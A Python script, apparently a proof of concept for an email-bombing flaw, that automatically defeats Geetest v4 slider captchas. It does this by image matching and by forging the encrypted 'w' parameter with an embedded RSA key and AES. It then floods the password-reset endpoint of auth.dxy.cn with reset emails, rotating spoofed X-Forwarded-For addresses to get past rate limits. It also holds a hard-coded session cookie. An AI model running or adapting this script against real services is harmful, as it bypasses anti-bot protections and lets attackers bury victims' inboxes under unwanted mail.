import hashlib
import json
import time
import ddddocr
import requests
import urllib3
import random
import rsa
from binascii import b2a_hex
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 分析文章
# https://www.52pojie.cn/thread-1162893-1-1.html
# https://mp.weixin.qq.com/s?__biz=MzIwNDI1NjUxMg==&mid=2651267503&idx=2&sn=dd268fb6efc03a51f24c34dc5eb01b18&chksm=8d3165c0ba46ecd69abecfd20ad61a020a2b572f4cb4435541dca5dc950fd1b7b7a6c046521c&scene=27

def do():
    email = " aa aa@qq.cOM "
    success_num = 0
    ip_list = []
    with open('../fuzz/ip.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            ip_list.append(line.rstrip('\n'))

    ocr = ddddocr.DdddOcr(show_ad=False)

    for ip in ip_list:
        captcha_id = '4e3430675330dd9a9218e5e70000dfe8'
        load_url = "https://gcaptcha4.geetest.com/load?callback=geetest_1688038419392&captcha_id=" + captcha_id \
                   + "&client_type=web&pt=1&lang=zho"
        r1 = requests.get(url=load_url, timeout=5, verify=False)
        data1 = json.loads(r1.text[22:-1])
        lot_number = data1['data']['lot_number']
        payload = data1['data']['payload'].replace("=", "%3D")
        process_token = data1['data']['process_token']
        slice = "https://static.geetest.com/" + data1['data']['slice']
        bg = "https://static.geetest.com/" + data1['data']['bg']
        slice_bytes = requests.get(url=slice, timeout=5, verify=False).content
        bg_bytes = requests.get(url=bg, timeout=5, verify=False).content
        img_xy = ocr.slide_match(slice_bytes, bg_bytes, simple_target=True)
        set_left = img_xy['target'][0]
        pow_msg = "1|0|md5|2023-06-26T15:41:52.790388+08:00|4e3430675330dd9a9218e5e70000dfe8|" \
                  + lot_number + "||ae9534a0f544b823"
        pow_sign = md5(pow_msg)

        e = {
            "setLeft": set_left,
            "passtime": 1243,
            "userresponse": set_left + 1.62166317631154,
            "device_id": "56ed3a359092206b372141945315c84e",
            "lot_number": lot_number,
            "pow_msg": pow_msg,
            "pow_sign": pow_sign,
            "geetest": "captcha",
            "lang": "zh",
            "ep": "123",
            "jkvg": "342414482",
            "t8d4": "rse4",
            "em": {
                "ph": 0,
                "cp": 0,
                "ek": "11",
                "wd": 1,
                "nt": 0,
                "si": 0,
                "sc": 0
            }
        }
        e = json.dumps(e)
        w = get_w(e)

        verify_url = "https://gcaptcha4.geetest.com/verify?callback=geetest_1688038451550&captcha_id=" + captcha_id \
                     + "&client_type=web&lot_number=" + lot_number + "&payload=" + payload + "&process_token=" \
                     + process_token + "&payload_protocol=1&pt=1&w=" + w
        r2 = requests.get(url=verify_url, timeout=5, verify=False)
        data2 = json.loads(r2.text[22:-1])
        if "seccode" not in r2.text:
            print("滑块验证失败!")
            continue

        pass_token = data2['data']['seccode']['pass_token']
        gen_time = data2['data']['seccode']['gen_time']
        captcha_output = data2['data']['seccode']['captcha_output']

        # 发送短信
        headers = {
            "Host": "auth.dxy.cn",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Cache-Control ": "max-age=0",
            "Content-Length": "505",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "dxy_da_cookie-id=ad8e6688d651a4b0fdc661f7b5b7f2011686570655431; ifVisitOldVerBBS=false; DXY_USER_GROUP=60; route_sso=1688002042.144.636.478537|497666198222cd036c3357f9eb060af1; JSESSIONID=A7B7871C4B42F38725F43F4119C1ED8B",
            "Origin": "https://auth.dxy.cn",
            "Referer": "https://auth.dxy.cn/accounts/forget?service=",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "dnt": "1",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-gpc": "1",
            "X-Forwarded-For": ip,
        }
        sms_body = 'email=' + email + '&captcha_id=' + captcha_id + '&lot_number=' \
                   + lot_number + '&pass_token=' + pass_token + '&gen_time=' \
                   + gen_time + '&captcha_output=' + captcha_output + '&resetType=2&service='

        sms_url = 'https://auth.dxy.cn/accounts/forget?'
        r3 = requests.post(url=sms_url, data=sms_body, headers=headers, timeout=5, verify=False)
        if '已发⾄至您' in r3.text:
            success_num = success_num + 1
            print('发送成功：累计发送：' + str(success_num))
        else:
            print('发送失败,发送邮件次数超出限制!')
            # print('发送失败!' + r3.text)
        if success_num >= 15:
            print("测试成功发送15条信息，存在邮箱轰炸漏洞！")
            break
        time.sleep(1)


def get_w(e):
    s = get_s()
    u = get_u(s)
    c = get_c(e, s)
    w = c + u
    return str(w, 'utf-8')


def get_u(s):
    # 分析gcaptcha4.js文件，获取到RSA公钥的DER格式和RSA的公开幂函
    public = '010001'
    public = int(public, 16)
    public_key = '00C1E3934D1614465B33053E7F48EE4EC87B14B95EF88947713D25EECBFF7E74C7977D02DC1D9451F79DD5D1C10C29ACB6A9B4D6FB7D0A0279B6719E1772565F09AF627715919221AEF91899CAE08C0D686D748B20A3603BE2318CA6BC2B59706592A9219D0BF05C9F65023A21D2330807252AE0066D59CEEFA5F2748EA80BAB81'
    public_key = int(public_key, 16)

    # 进行加密
    pub_key = rsa.PublicKey(e=public, n=public_key)
    return b2a_hex(rsa.encrypt(bytes(s, encoding='utf-8'), pub_key))


def get_c(e, s):
    text = e.encode('utf-8')
    key = s.encode('utf-8')
    cryptor = AES.new(key, AES.MODE_CBC, b'0000000000000000')
    padded_data = pad(text, AES.block_size)
    ciphertext = cryptor.encrypt(padded_data)
    return b2a_hex(ciphertext)


def get_s():
    return get_4_str() + get_4_str() + get_4_str() + get_4_str()


def get_4_str():
    return hex(int(65536 * (1 + random.random())))[3:].zfill(4)


def md5(str):
    md5 = hashlib.md5()
    md5.update(str.encode("utf-8"))
    result = md5.hexdigest()
    return result


if __name__ == "__main__":
    do()
